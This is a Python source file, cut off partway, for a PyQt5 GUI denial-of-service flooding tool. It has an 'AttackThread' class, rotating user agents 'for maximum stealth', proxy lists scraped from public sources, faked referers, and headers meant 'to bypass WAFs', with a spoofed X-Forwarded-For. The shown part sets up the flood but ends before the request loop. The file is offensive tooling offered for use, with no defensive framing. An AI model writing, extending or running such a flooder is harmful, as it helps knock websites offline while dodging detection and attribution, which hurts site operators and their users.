import sys
import requests
import asyncio
import aiohttp
import random
import re
import itertools
import time
from urllib.parse import urlparse

# PyQt5 imports for the GUI
from PyQt5.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QWidget,
                             QLabel, QLineEdit, QPushButton, QMessageBox,
                             QTextEdit, QCheckBox, QHBoxLayout, QComboBox)
from PyQt5.QtGui import QFont
from PyQt5.QtCore import QThread, Qt, pyqtSignal

# --- ADVANCED CONFIGURATION ---

# A massive list of User-Agents for maximum stealth
USER_AGENTS = [
    # Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    # Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    # Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
    # Mobile
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
]

# A much larger list of proxy sources for better coverage
PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
    "https://spys.me/proxy.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
]

# A list of referers to make traffic look like it's coming from other sites
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.reddit.com/",
    "https://www.youtube.com/",
]

# --- ADVANCED ATTACK THREAD ---

class AttackThread(QThread):
    log_signal = pyqtSignal(str)

    def __init__(self, target_url, num_requests, duration, use_proxies, use_post, stealth_mode, mixed_mode):
        super().__init__()
        self.target_url = target_url
        self.num_requests = num_requests
        self.duration = duration
        self.is_attacking = True
        self.use_proxies = use_proxies
        self.use_post = use_post
        self.stealth_mode = stealth_mode
        self.mixed_mode = mixed_mode
        self.proxy_list = []
        self.success_count = 0
        self.error_count = 0

    async def fetch_proxies(self, session, url):
        """Asynchronously fetch proxies from a given URL."""
        try:
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                text = await response.text()
                proxies = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{2,5})", text)
                # Format for aiohttp: http://ip:port
                return [f"http://{ip}:{port}" for ip, port in proxies]
        except Exception:
            return [] # Fail silently to not flood logs

    async def get_all_proxies(self):
        """Gather proxies from multiple sources concurrently."""
        if not self.use_proxies:
            return []

        self.log_signal.emit("[*] Fetching proxies from multiple sources...")
        async with aiohttp.ClientSession() as session:
            tasks = [self.fetch_proxies(session, url) for url in PROXY_SOURCES]
            proxy_lists = await asyncio.gather(*tasks)
            all_proxies = list(itertools.chain.from_iterable(proxy_lists))
            # Deduplicate the list
            unique_proxies = list(set(all_proxies))
            self.log_signal.emit(f"[+] Fetched and deduplicated {len(unique_proxies)} proxies.")
            return unique_proxies

    def get_realistic_headers(self):
        """Generate a highly realistic set of headers to bypass WAFs."""
        ua = random.choice(USER_AGENTS)
        is_chrome = "Chrome" in ua
        is_firefox = "Firefox" in ua

        headers = {
            "User-Agent": ua,
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0",
            "Referer": random.choice(REFERERS) if self.stealth_mode else ""
        }
        
        if self.stealth_mode:
          headers["X-Forwarded-For"] = "0.0.0.0"


